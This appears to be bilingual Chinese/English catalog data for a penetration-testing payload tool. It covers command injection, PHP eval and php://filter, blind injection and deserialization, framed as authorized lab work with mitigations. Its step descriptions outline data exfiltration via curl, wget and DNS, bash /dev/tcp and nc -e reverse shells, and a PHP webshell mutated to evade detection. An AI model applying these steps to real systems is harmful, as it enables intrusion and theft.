overview.zh: 操作系统命令注入覆盖把用户输入拼入 Shell 命令的攻击场景：注入点接收参数后由操作系统解释执行。包含分隔符探测、Linux 与 Windows 命令执行、时间盲注延时确认、HTTP/DNS 外带回传五类验证维度，并附空格、关键字与编码绕过变体。
overview.en: OS command injection covers scenarios where user input is concatenated into shell commands: the injection point hands parameters to an operating-system interpreter. It spans five verification dimensions—separator probing, Linux and Windows command execution, time-based blind confirmation, and HTTP/DNS out-of-band exfiltration—plus space, keyword, and encoding bypass variants.

vulnerability.zh: 根因是应用把不可信输入拼进交给 Shell 的命令字符串，未使用参数数组或固定 API，分号、管道、反引号等控制符因此从数据升级为命令语法，缺少对控制字符与元字符的结构化校验。
vulnerability.en: The root cause is that the application concatenates untrusted input into the command string handed to a shell without argument arrays or fixed APIs, so separators such as semicolons, pipes, and backticks escalate from data to command syntax, with no structural validation of control characters or metacharacters.

exploitation.zh: 按 Payload 列表顺序使用：先用第 1 步的分号、管道、反引号与 $() 载荷探测注入点，出现 uid= 或与基线的可辨识差异即确认可控；再用第 2、3 步在 Linux 与 Windows 上以 whoami、cat /etc/passwd、type win.ini 验证执行；无回显时用第 4 步延时观察耗时，第 5 步把输出经 HTTP/DNS 外带。占位符在全局变量菜单替换；被 WAF 拦截时改用空格、关键字与编码变体。
exploitation.en: Use payloads in list order: probe the injection point with step 1's semicolon, pipe, backtick, and $() payloads—uid= output or a recognizable baseline difference confirms control; verify execution on Linux and Windows via steps 2-3 with whoami, cat /etc/passwd, and type win.ini; without echo, watch step 4's delay and exfiltrate output via HTTP/DNS with step 5. Replace placeholders in the global variables menu; on WAF blocks use the space, keyword, and encoding variants.

mitigation.zh: 避免拼接 Shell 命令：改用语言内置参数数组或固定 API，对输入做类型与允许列表校验并拒绝控制字符；以最小权限账户运行并限制子进程与出站网络。修复后重放第 1 步全部分隔符样例与延时载荷，确认响应与基线一致、日志无异常子进程。
mitigation.en: Avoid building shell commands by concatenation: use language-native argument arrays or fixed APIs, validate input by type and allowlist, and reject control characters; run least-privileged and restrict child processes and outbound traffic. After the fix, replay all separator samples and delay payloads from step 1 and confirm responses match the baseline with no anomalous child processes in logs.

title.zh: 定位命令注入点

description.zh: 将 id 依次拼接在分号、竖线、反引号、$()、&&、|| 六种分隔符后提交到可疑参数。命中判据：响应出现 uid=… 输出或与正常请求存在可辨差异。
description.en: Submit id appended after six separators (; | backtick $() && ||) to the suspect parameter. Success: response shows uid= output or a distinguishable diff.

title.zh: 确认执行身份与读取能力
title.en: Confirm execution identity and read access

description.zh: 用第 1 步命中的分隔符执行 whoami、id 并读取 /etc/passwd 与根目录列表，摸清 Web 服务账户权限。命中判据：响应返回用户名或 passwd 内容。
description.en: Using the separator that hit in step 1, run whoami, id and read /etc/passwd to map the service account. Success: username or passwd content returned.

title.zh: 判定回显与盲注形态

description.zh: 对无回显入口改注 sleep 5、ping -c 5 与 timeout 5，用响应耗时差判断命令是否真实执行。命中判据：注入请求耗时稳定增加约 5 秒。
description.en: For non-echoing inputs switch to sleep 5 / ping -c 5 / timeout 5 and judge by timing. Success: response latency grows by about 5 seconds.

title.zh: 变形命令绕过关键字过滤

description.zh: 命令名被过滤时用引号拆分、反斜杠转义与通配符路径重组 cat 等命令再执行。命中判据：变形后仍返回文件内容或命令输出。
description.en: When command names are filtered, rebuild cat via quote splitting, escapes and wildcard paths. Success: obfuscated form still returns output.

title.zh: 外带数据建立回传通道
title.en: Exfiltrate data over HTTP and DNS

description.zh: 用 curl、wget 把 whoami、id 输出编码进 URL 参数外带，或用 nslookup 把结果拼进子域名走 DNS 通道回传。命中判据：接收端日志出现携带数据的请求。
description.en: Exfiltrate whoami/id output via curl/wget URL params or nslookup subdomains. Success: collector logs receive the data.

analysis.zh: 操作系统命令注入无害标记只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: OS Command Injection Harmless Marker is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 使用 printf 固定标记证明参数到达命令解释器，不读取文件、不联网也不启动子任务。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: PHP 动态执行边界验证

description.zh: 覆盖 PHP 动态执行与命令执行边界验证：从 eval/assert/preg_replace 等危险函数形态，到 system 系命令执行，再到一句话木马与函数名拼接变形，用于确认 PHP 注入点的执行能力。
description.en: Covers PHP dynamic-execution and command-execution boundary validation: from dangerous-function forms such as eval/assert/preg_replace through system command execution to webshells and function-name-splicing variants, confirming the execution capability of PHP injection points.

prerequisites.zh: 确认 PHP 动态执行边界验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for PHP Dynamic-Execution Boundary Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: PHP 动态执行边界验证针对把请求参数交给 eval/assert 等动态求值或 system 等命令函数的 PHP 注入场景。覆盖危险函数形态、命令执行、一句话木马与变形一句话四类变体，用于确认 PHP 注入点的代码与命令执行能力。
overview.en: PHP dynamic-execution boundary validation targets PHP injection scenarios where request parameters reach eval/assert dynamic evaluation or system-style command functions. It covers four variants—dangerous function forms, command execution, one-liner webshells, and obfuscated one-liners—to confirm code and command execution capability at the PHP injection point.

vulnerability.zh: 根因是应用把不可信参数传入 eval、assert、preg_replace /e、create_function 等求值结构，或拼入 system、exec、shell_exec、passthru 等命令函数；字符串因此被 PHP 解释为代码或交给系统 Shell 执行。
vulnerability.en: The root cause is untrusted parameters reaching evaluation constructs such as eval, assert, preg_replace /e, or create_function, or being concatenated into command functions like system, exec, shell_exec, and passthru; strings are thereby interpreted as PHP code or handed to the system shell.

exploitation.zh: 按 Payload 列表顺序使用：先用第 1 步 eval/assert/preg_replace 形态确认动态求值点，cmd=id 出现 uid= 即命中；再用第 2 步命令函数验证执行；确认后第 3 步部署一句话木马并以 cmd=id 验证；被过滤时用第 4 步拼接与 Base64 变形；WAF 拦截改用回调与变量函数变体。
exploitation.en: Use payloads in list order: confirm dynamic-evaluation points with step 1's eval/assert/preg_replace forms—a uid= response after cmd=id is a hit; verify command execution with step 2's functions; once confirmed, deploy the step-3 one-liner webshell and verify via cmd=id; when filtered, use step 4's concatenation and Base64 variants; on WAF blocks switch to callback and variable-function variants.

mitigation.zh: 移除动态求值与命令拼接，改用固定 API 和参数数组；升级受支持 PHP 并淘汰 assert/create_function 等旧路径，上传目录不可执行。修复后重放第 1、2 步样例，确认求值与命令函数均拒绝可控参数且无异常子进程。
mitigation.en: Remove dynamic evaluation and command concatenation in favor of fixed APIs and argument arrays; upgrade to supported PHP and retire legacy paths like assert/create_function, keeping upload directories non-executable. After the fix, replay step 1 and 2 samples and confirm evaluation and command functions reject controlled input with no anomalous child processes.

title.zh: 探测动态执行入口

description.zh: 向可疑参数提交 eval、assert、preg_replace /e 与 create_function 等动态执行形态。命中判据：cmd=id 返回 uid=… 输出。
description.en: Feed eval/assert/preg_replace-e/create_function forms into suspect params. Success: cmd=id returns uid= output.

title.zh: 执行系统命令摸清权限
title.en: Run system commands to map privileges

description.zh: 用 system、exec、反引号等函数执行 whoami，确认当前进程身份与回显能力。命中判据：页面输出当前用户名。
description.en: Run whoami through system/exec/backticks to learn the process identity. Success: current username appears in the page.

title.zh: 部署一句话木马

description.zh: 把 @eval($_POST[cmd]) 形态的木马写入可访问的 PHP 文件，形成稳定控制点。命中判据：POST cmd=id 后返回命令输出。
description.en: Write an @eval($_POST[cmd]) style one-liner to a reachable PHP file. Success: POST cmd=id returns command output.

title.zh: 变形木马规避查杀
title.en: Mutate the webshell to evade detection

description.zh: 用动态调用、函数名拼接与 Base64 还原改造一句话，绕过静态特征检测。命中判据：变形后连接仍返回输出。
description.en: Reshape the one-liner with dynamic calls, name concat and Base64. Success: mutated shell still returns output.

title.zh: 绕过函数黑名单

description.zh: 危险函数被禁时改用变量函数 $func($cmd) 形式执行命令。命中判据：黑名单之外的形态成功执行命令。
description.en: When dangerous functions are disabled, switch to variable-function $func($cmd). Success: execution succeeds outside the blacklist.

analysis.zh: PHP 动态执行边界验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: PHP Dynamic-Execution Boundary Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 在专用 PHP 夹具中只输出固定标记，区分字符串回显、模板插值和真正的服务端代码求值。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: PHP Filter 受控资源边界

description.zh: 覆盖 php://filter 受控资源利用：从 data:// 内联流经 base64-decode 解码执行，到 filter 链生成器产出编码链，再到 iconv 与 base64 组合链投递，确认包含参数可承载任意代码流。
description.en: Covers controlled-resource exploitation via php://filter: from data:// inline streams decoded with base64-decode through chains produced by a filter-chain generator to iconv and base64 composite chain delivery, confirming include parameters can carry arbitrary code streams.

prerequisites.zh: 确认 PHP Filter 受控资源边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for PHP Filter Controlled-Resource Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: PHP Filter 受控资源边界针对包含参数可承载任意代码流的场景：php://filter 链可将内联数据或目标文件变换后交给 PHP 解释。覆盖 data:// 内联流、编码链生成器与 iconv+base64 组合链三类利用路径。
overview.en: The PHP filter controlled-resource boundary targets inclusion parameters that can carry arbitrary code streams: php://filter chains transform inline data or target files before PHP interprets them. It covers three exploitation paths—data:// inline streams, a filter-chain generator, and iconv+base64 combined chains.

vulnerability.zh: 根因是用户控制的包含参数进入支持 filter 的 PHP 流 API 且未限制 scheme 与转换链，过滤器链可在读取阶段把攻击者字节流还原为 PHP 代码，再由 include 语义执行。
vulnerability.en: The root cause is a user-controlled inclusion parameter reaching PHP's filter-capable stream API without scheme or chain restrictions; the filter chain can reconstruct attacker bytes into PHP code during the read phase, then executed under include semantics.

exploitation.zh: 按 Payload 列表顺序使用：先用第 1 步 data:// 加 base64-decode 验证内联流解码执行，输出 PAYLOADER_LAB 即命中；第 2 步补全媒体类型后执行 system；内容被检测拦截时用第 3 步生成器产出编码链，第 4 步以 iconv+base64 完整链投递。
exploitation.en: Use payloads in list order: first validate inline-stream decoding with step 1's data:// plus base64-decode—PAYLOADER_LAB output is a hit; run system after completing the media type in step 2; when content is blocked by detection, generate an encoded chain with step 3's generator and deliver the full iconv+base64 chain of step 4.

mitigation.zh: 禁止用户输入进入 include/require，读取接口只接受服务端对象 ID 并拒绝 php://filter 等 wrapper；限制可用过滤器与 scheme。修复后重放第 1 步与第 4 步的 filter 链，确认被拒绝且正常模板加载不受影响。
mitigation.en: Keep user input out of include/require, accept only server-side object IDs, and reject wrappers such as php://filter; restrict available filters and schemes. After the fix, replay the step-1 and step-4 filter chains and confirm rejection while normal template loading is unaffected.

title.zh: 解码内联流确认链路
title.en: Confirm the chain on an inline stream

description.zh: 提交 base64-decode 过滤器叠加 data:// 的包含请求，确认过滤链可作用于内联资源。命中判据：返回解码内容的执行结果。
description.en: Include a base64-decode filter over data:// to confirm the chain works on inline resources. Success: decoded content executes.

title.zh: 经 data 流执行系统命令
title.en: Execute commands via the data stream

description.zh: 把内联流换成 system($_GET[cmd]) 的 Base64 形式，经解码后执行命令。命中判据：cmd 参数返回命令输出。
description.en: Swap the stream for a Base64 of system($_GET[cmd]). Success: the cmd parameter returns command output.

title.zh: 生成目标编码链
title.en: Generate a filter chain for target code

description.zh: 用生成器以任意 PHP 代码为种子产出完整 php://filter 编码链。命中判据：生成结果可直接用作包含参数。
description.en: Run the chain generator seeded with target PHP code. Success: output works directly as the include parameter.

title.zh: 投递完整链执行代码
title.en: Deliver the full chain for execution

description.zh: 提交 iconv 与 base64 组合的长链载荷，不落地文件直接执行代码。命中判据：链还原的代码产生预期输出。
description.en: Submit the long iconv+base64 chain for fileless execution. Success: the seeded code produces output.

title.zh: 绕过内容检测

description.zh: 请求被内容检测拦截时，用编码链把 PHP 语义藏进过滤器变换层再投递。命中判据：链式载荷未被拦截且执行成功。
description.en: When content inspection blocks requests, hide PHP semantics inside filter transforms. Success: the chain passes and executes.

analysis.zh: PHP Filter 受控资源边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: PHP Filter Controlled-Resource Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 只对沙箱标记文件验证 php://filter 解析，禁止构造动态代码链或读取应用源码。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: 盲命令注入短延迟验证

description.zh: 覆盖无回显命令注入的确认与外带验证：从延时探测注入点，到 DNS、HTTP 与 ICMP 三通道数据外带，再到反弹 Shell 落地，并附 Base64 编码反弹绕过，用于在无输出场景确认命令执行。
description.en: Covers confirmation and out-of-band validation of blind command injection: from delay-based injection probing through DNS, HTTP, and ICMP exfiltration channels to reverse-shell landing, with Base64-encoded reverse-shell bypass, confirming command execution in no-output scenarios.

prerequisites.zh: 确认 盲命令注入短延迟验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Blind Command Injection Short-Delay Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 盲命令注入短延迟验证针对无回显命令注入的确认场景：命令执行但响应不返回输出。覆盖延时探测、DNS/HTTP/ICMP 三通道外带与反弹 Shell 五类验证维度，并附 Base64 编码反弹绕过变体。
overview.en: Blind command injection short-delay validation targets command injection without response echo: commands execute but output is not returned. It spans five verification dimensions—delay probing, DNS/HTTP/ICMP out-of-band channels, and reverse shells—plus a Base64-encoded reverse-shell bypass variant.

vulnerability.zh: 根因与有回显注入相同：不可信输入拼入 Shell 命令字符串，分隔符升级为语法；区别在于应用不回显结果，必须依赖时间差异或出站连接作为命令执行证据。
vulnerability.en: The root cause matches echo-enabled injection: untrusted input is concatenated into a shell command string and separators escalate to syntax; the difference is that the application does not echo results, so timing deltas or outbound connections must serve as execution evidence.

exploitation.zh: 按 Payload 列表顺序使用：先用第 1 步 sleep 5/timeout 5 经四种分隔符注入，响应耗时增加约 5 秒即确认盲注；再用第 2-4 步经 DNS、HTTP、ICMP 把 whoami/id 输出外带到攻击者侧，以日志为证；需交互控制时第 5 步反弹 Shell 连接授权监听器。占位符在全局变量菜单替换；被拦截时改用 Base64 编码反弹变体。
exploitation.en: Use payloads in list order: first inject step 1's sleep 5/timeout 5 through four separators—about 5 extra seconds of response time confirms blind injection; then exfiltrate whoami/id output via DNS, HTTP, and ICMP with steps 2-4 using the logs as evidence; for interactive control, run step 5's reverse shell against an authorized listener. Replace placeholders in the global variables menu; on blocks, use the Base64-encoded reverse variant.

mitigation.zh: 移除 Shell 拼接改用参数数组，对输入拒绝分隔符与控制字符；限制服务出站网络与子进程创建，使延时与外带通道失效。修复后重放第 1 步延时载荷并监控第 2-5 步外带监听器，确认无耗时差异、无外带请求与回连。
mitigation.en: Replace shell concatenation with argument arrays and reject separators and control characters; restrict egress and child-process creation so delay and OOB channels fail. After the fix, replay step-1 delay payloads while monitoring the step 2-5 collectors, confirming no timing deltas, outbound requests, or callbacks.

title.zh: 延时探测盲注点

description.zh: 以分号、竖线、反引号与 $() 注入 sleep 5 / timeout 5，用耗时判断注入是否生效。命中判据：响应耗时稳定增加约 5 秒。
description.en: Inject sleep 5 / timeout 5 via ; | backtick and $() and judge by timing. Success: latency grows ~5s consistently.

title.zh: DNS 外带确认执行

description.zh: 用 nslookup、ping、host 把 whoami、id 输出编码进攻击者域名的子域查询。命中判据：DNS 侧收到携带输出的查询。
description.en: Encode whoami/id output into subdomain queries toward the attacker zone. Success: DNS logs carry the output.

title.zh: HTTP 通道外带数据

description.zh: 用 curl、wget、certutil 把命令输出或文件内容经 HTTP 请求外带。命中判据：攻击者 HTTP 日志收到数据请求。
description.en: Exfiltrate outputs or files via curl/wget/certutil HTTP calls. Success: collector logs receive the data.

title.zh: 建立反弹 Shell

description.zh: 注入 bash /dev/tcp、nc -e 与 python socket 反弹载荷连接监听器。命中判据：收到交互 Shell 并可执行 whoami。
description.en: Fire bash /dev/tcp, nc -e and python reverse payloads at the listener. Success: an interactive shell runs whoami.

title.zh: 编码反弹绕过过滤

description.zh: 反弹明文被拦截时改为 Base64 解码管道形式投递反弹命令。命中判据：编码载荷成功建立回连并可执行命令。
description.en: When plaintext is blocked, deliver the reverse shell as a Base64-decoded pipe. Success: the encoded payload calls back.

analysis.zh: 盲命令注入短延迟验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Blind Command Injection Short-Delay Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 使用一秒以内的固定延迟和服务端进程证据验证执行，排除网络抖动、缓存和重试。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: 不安全反序列化类型边界

description.zh: 覆盖多语言不安全反序列化验证：从 ysoserial 生成 Java CommonsCollections 载荷，到 PHP __destruct POP 链、Python __reduce__ 与 .NET 载荷，确认各运行时可利用性。
description.en: Covers exploitation validation of insecure deserialization across runtimes: from ysoserial-generated Java CommonsCollections payloads through PHP __destruct POP chains, Python __reduce__, and .NET payloads, confirming exploitability per runtime.

prerequisites.zh: 确认 不安全反序列化类型边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Unsafe Deserialization Type Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 不安全反序列化类型边界针对把不可信序列化数据直接还原为运行时对象的场景，覆盖 Java、PHP、Python 与 .NET 四个生态。验证 ysoserial 链、PHP __destruct POP 链、Python __reduce__ 与 .NET ObjectDataProvider 四类利用路径。
overview.en: The unsafe deserialization type boundary targets scenarios where untrusted serialized data is restored directly into runtime objects, spanning Java, PHP, Python, and .NET. It validates four exploitation paths: ysoserial chains, PHP __destruct POP chains, Python __reduce__, and .NET ObjectDataProvider.

vulnerability.zh: 根因是应用对不可信数据调用反序列化且未限制可还原类型，序列化流中的类与魔术方法（readObject/__destruct/__reduce__ 等）在业务校验前被实例化或调用，类路径中的 gadget 可组合为代码执行。
vulnerability.en: The root cause is deserializing untrusted data without type restrictions; classes and magic methods in the stream (readObject/__destruct/__reduce__, etc.) are instantiated or invoked before business validation, and classpath gadgets combine into code execution.

exploitation.zh: Java 目标用第 1 步 ysoserial CommonsCollections1 生成 curl|bash 载荷投递，以 HTTP 日志收到 shell.sh 请求为命中；PHP 用第 2 步构造 __destruct POP 链，Python 用第 3 步 __reduce__ 返回 os.system，.NET 用第 4 步 ObjectDataProvider 配合 Json.Net。被签名拦截时改用重签名变体。
exploitation.en: For Java, generate the curl|bash payload with step 1's ysoserial CommonsCollections1—a shell.sh request in your HTTP log is a hit; for PHP build step 2's __destruct POP chain, for Python step 3's __reduce__ returning os.system, and for .NET step 4's ObjectDataProvider with Json.Net. If signature checks block the payload, use the re-signed variant.

mitigation.zh: 停止对不可信数据使用原生反序列化，迁移到 JSON 等数据格式；必须兼容时限制允许类型、校验签名并隔离加载进程，移除危险 gadget 依赖。修复后重放第 1-4 步载荷，确认反序列化被拒绝且无异常类加载与子进程。
mitigation.en: Stop native deserialization of untrusted data and migrate to data formats like JSON; where compatibility is required, restrict allowed types, verify signatures, isolate the loading process, and remove dangerous gadget dependencies. After the fix, replay the step 1-4 payloads and confirm rejection with no anomalous class loading or child processes.

title.zh: 定位反序列化入口

description.zh: 枚举 Cookie、请求体与接口中的序列化数据字段，判断目标是 Java、PHP 还是 Python 栈。命中判据：畸形序列化串引发解析报错。
description.en: Hunt serialized blobs in cookies/bodies/APIs and fingerprint the stack. Success: malformed blobs trigger parser errors.

title.zh: 投递 Java gadget 载荷

description.zh: 用 ysoserial 生成 CommonsCollections 载荷投向 Java 入口，命令为下载脚本并执行。命中判据：HTTP 日志收到请求或目标侧出现执行。
description.en: Generate a CommonsCollections payload whose command curls and pipes a script. Success: collector sees the fetch or execution occurs.

title.zh: 构造 PHP POP 链

description.zh: 定义 __destruct 触发的 Chain 到 Action 两级调用链并输出序列化串投递。命中判据：反序列化后返回 whoami 输出。
description.en: Define a __destruct POP chain and submit its serialized form. Success: whoami output returns after unserialize.

title.zh: 构造 Python pickle 载荷

description.zh: 用 __reduce__ 返回 os.system 与命令元组并 dumps 输出，投向 Python 入口。命中判据：目标执行命令并回显。
description.en: Build a __reduce__ pickle mapping to os.system and deliver it. Success: the command executes and echoes.

title.zh: 重签名载荷通过校验

description.zh: 入口校验 HMAC 签名时，用泄露的密钥对载荷重新计算签名后提交。命中判据：重签后的载荷被接受并触发执行。
description.en: When the entry verifies HMAC, recompute the signature with the leaked key. Success: the re-signed payload is accepted and fires.

analysis.zh: 不安全反序列化类型边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Unsafe Deserialization Type Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 使用无副作用 PayloaderMarker 类型验证不可信数据能否选择运行时类型或回调，不加载真实 gadget。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: PHP 反序列化类型边界

description.zh: 覆盖 PHP 反序列化的利用边界验证：从魔术方法触发点定位与 POP 链构造，到 Phar 元数据载荷投递，再到 Session 处理器混用注入，并附属性可见性前缀对照，用于确认反序列化到代码执行的链路。
description.en: Covers PHP deserialization exploitation boundaries: from magic-method trigger mapping and POP chain construction through Phar metadata payload delivery to session-handler mixing injection, with property-visibility prefix controls, confirming the path from deserialization to code execution.

prerequisites.zh: 确认 PHP 反序列化类型边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for PHP Deserialization Type Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: PHP 反序列化类型边界针对 unserialize 接受不可信数据的场景：魔术方法与对象链在还原时被触发。覆盖魔术方法触发点定位、POP 链构造、Phar 元数据投递与 Session 处理器混用四类路径，并附属性可见性前缀对照。
overview.en: The PHP deserialization type boundary targets unserialize accepting untrusted data, where magic methods and object chains trigger during restoration. It covers four paths—magic-method trigger points, POP-chain construction, Phar metadata delivery, and session-handler mixing—plus property-visibility prefix comparison.

vulnerability.zh: 根因是不可信字符串进入 unserialize 且 allowed_classes 未限制，__wakeup、__destruct 等魔术方法在对象还原时自动执行；存在可控调用链时，属性值可沿 POP 链传递到 system 等危险函数。
vulnerability.en: The root cause is untrusted strings entering unserialize without allowed_classes restrictions, so magic methods like __wakeup and __destruct execute automatically during restoration; with a controllable call chain, property values travel the POP chain into dangerous functions such as system.

exploitation.zh: 按 Payload 列表顺序使用：先用第 1 步脚本确认 __wakeup/__destruct 的自动触发；再用第 2 步 Chain→Action POP 链输出序列化串投递，返回 whoami 输出即命中；有文件操作函数时第 3 步生成 exploit.phar 经 phar:// 触发；会话处理器混用时第 4 步竖线注入。被拦截时按属性可见性前缀调整序列化串。
exploitation.en: Use payloads in list order: confirm automatic __wakeup/__destruct triggering with step 1's script; deliver step 2's Chain→Action POP chain serialized string—returned whoami output is a hit; with file operations present, trigger step 3's exploit.phar via phar://; with mixed session handlers, use step 4's pipe injection. Adjust the serialized string with property-visibility prefixes when blocked.

mitigation.zh: 禁止对不可信数据调用 unserialize，改用 JSON；必须兼容时设置 allowed_classes=false 或最小类集并校验签名，统一会话处理器并升级 PHP。修复后重放第 1-4 步样例，确认对象链被拒绝且无魔术方法副作用。
mitigation.en: Stop calling unserialize on untrusted data and use JSON instead; where compatibility is required, set allowed_classes=false or a minimal class set, verify signatures, unify session handlers, and upgrade PHP. After the fix, replay the step 1-4 samples and confirm object chains are rejected with no magic-method side effects.

title.zh: 确认魔术方法触发

description.zh: 提交带 __wakeup 与 __destruct 的序列化对象，确认魔术方法在反序列化时自动执行。命中判据：响应出现对应方法的输出。
description.en: Submit objects with __wakeup/__destruct to confirm auto-triggering. Success: method output appears in the response.

title.zh: 构造 POP 链执行命令
title.en: Build a POP chain to execute commands

description.zh: 构造 __destruct 调用 system 的两级 POP 链并投递序列化串。命中判据：还原对象链后返回 whoami 用户名。
description.en: Chain __destruct into system and deliver the serialized string. Success: whoami output returns after unserialization.

title.zh: 打包 Phar 元数据载荷

description.zh: 生成带恶意元数据的 phar 并经 phar:// 流访问触发反序列化。命中判据：元数据对象被还原并执行。
description.en: Build a phar with hostile metadata and reach it via phar://. Success: the metadata object unserializes and fires.

title.zh: 会话处理器混用注入

description.zh: 写入侧用 php_serialize 写入竖线前缀对象，读取侧 php 处理器时把其后内容反序列化。命中判据：注入对象被还原执行。
description.en: Write a pipe-prefixed object under php_serialize; the php reader unserializes it. Success: the injected object fires.

title.zh: 调整属性可见性前缀

description.zh: 按 private、protected 属性补全 NUL 前缀修饰序列化串，适配目标类定义。命中判据：带前缀串被正确还原。
description.en: Add NUL prefixes for private/protected members to match the class. Success: the prefixed string unserializes cleanly.

analysis.zh: PHP 反序列化类型边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: PHP Deserialization Type Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

